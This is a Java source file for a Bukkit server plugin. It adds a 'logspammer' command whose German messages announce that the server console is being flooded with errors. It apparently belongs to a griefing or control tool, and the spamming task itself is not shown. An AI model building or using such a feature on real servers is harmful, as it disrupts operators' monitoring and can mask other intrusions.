package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class Command_LogSpammer extends CommandBase {

    private boolean enabled = false;

    public Command_LogSpammer() {
        super("logspammer", "-", Category.WORLD);
        Bukkit.getScheduler().runTaskTimer(Start.INSTANCE, new Command_LogSpammer2(this), 1L, 1L);
    }

    public void execute(String[] args, Player p) {
        if (!this.enabled) {
            this.enabled = true;
            p.sendMessage(Start.INSTANCE.chatPrefix + "Jetzt wird die Konsole mit Fehlern zugespammt!");
        } else {
            this.enabled = false;
            p.sendMessage(Start.INSTANCE.chatPrefix + "Die Konsole wird nicht mehr mit Fehlern zugespammt!");
        }
    }

    static boolean isEnabledFromInstance(Command_LogSpammer var0) {
        return var0.enabled;
    }

}
